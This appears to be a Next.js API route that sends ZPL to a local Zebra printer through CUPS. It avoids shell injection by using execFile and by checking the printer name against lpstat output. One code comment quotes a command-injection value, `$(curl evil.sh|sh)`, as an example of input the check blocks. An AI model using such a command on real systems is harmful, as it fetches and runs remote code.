import { NextRequest, NextResponse } from "next/server"
import { execFile as execFileCb } from "child_process"
import { requireAdmin } from "@/lib/auth/api-auth"

// No `exec` import: every subprocess here goes through the execFile family,
// so no command string is ever handed to a shell -- printer_name and zpl are
// passed as an argv array / stdin, never interpolated into a shell string.
// Mirrors the pattern in scripts/print-proxy.mjs (resolvePrinter/execFile).

const DEFAULT_PRINTER = "Zebra_Technologies_ZTC_ZD230_203dpi_ZPL"

function runLpstat(args: string[]): Promise<string> {
  return new Promise((resolve) => {
    execFileCb("lpstat", args, { encoding: "utf8", timeout: 5000 }, (error, stdout) => {
      resolve(error ? "" : stdout)
    })
  })
}

async function resolvePrinter(name: string | undefined): Promise<string | null> {
  if (!name) return DEFAULT_PRINTER

  // Requiring `name` to match a printer CUPS actually knows about is both the
  // correct semantic check and what blocks injection -- a value like
  // `$(curl evil.sh|sh)` simply never appears in lpstat's output.
  const output = await runLpstat(["-p"])
  const printers = output
    .split("\n")
    .map((line) => line.match(/^printer (\S+)/)?.[1])
    .filter((p): p is string => !!p)

  return printers.includes(name) ? name : null
}

function runLp(printerName: string, zpl: string): Promise<{ stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const child = execFileCb(
      "lp",
      ["-d", printerName, "-o", "raw", "-"],
      { timeout: 10000, encoding: "utf8" },
      (error, stdout, stderr) => {
        if (error) reject(Object.assign(error, { stderr }))
        else resolve({ stdout, stderr })
      }
    )
    child.stdin?.end(zpl)
  })
}

// POST /api/local-print - Send ZPL to local USB Zebra printer
export async function POST(request: NextRequest) {
  try {
    const { error: authError } = await requireAdmin()
    if (authError) return authError

    const { zpl, printer_name } = await request.json()

    if (!zpl || typeof zpl !== "string") {
      return NextResponse.json({ error: "ZPL data required" }, { status: 400 })
    }

    // If the local print proxy is reachable AND the caller did not pin a
    // specific printer, refuse so the page falls through to its proxy path.
    // Stops cached browsers from silently sending raw ZPL to the wrong
    // (Zebra) printer when the user actually has a Dcode/4BARCODE on the
    // proxy. Pinning printer_name keeps the legacy direct-to-Zebra path.
    if (!printer_name) {
      try {
        const probe = await fetch("http://localhost:3001/status", {
          signal: AbortSignal.timeout(800),
        })
        if (probe.ok) {
          return NextResponse.json(
            { success: false, error: "Local print proxy is online; use proxy path." },
            { status: 503 },
          )
        }
      } catch {
        // Proxy not reachable — fall through to direct ZPL path
      }
    }

    if (printer_name !== undefined && typeof printer_name !== "string") {
      return NextResponse.json({ error: "printer_name must be a string" }, { status: 400 })
    }

    const printerName = await resolvePrinter(printer_name)
    if (!printerName) {
      return NextResponse.json(
        { success: false, error: `Unknown printer: ${printer_name}` },
        { status: 400 },
      )
    }

    const { stdout } = await runLp(printerName, zpl)

    console.log("[Local Print] Sent to", printerName, stdout)

    return NextResponse.json({
      success: true,
      message: "Print job sent",
      printer: printerName,
      output: stdout
    })
  } catch (error: any) {
    console.error("[Local Print] Error:", error)
    return NextResponse.json({
      success: false,
      error: error.message || "Print failed"
    }, { status: 500 })
  }
}

// GET /api/local-print - Check printer status
export async function GET() {
  try {
    const output = await runLpstat(["-p", "-d"])

    const printers = output.split("\n")
      .slice(0, 20)
      .filter(line => line.includes("printer "))
      .map(line => {
        const match = line.match(/printer (\S+) is (\w+)/)
        return match ? { name: match[1], status: match[2] } : null
      })
      .filter(Boolean)

    return NextResponse.json({ printers })
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 })
  }
}
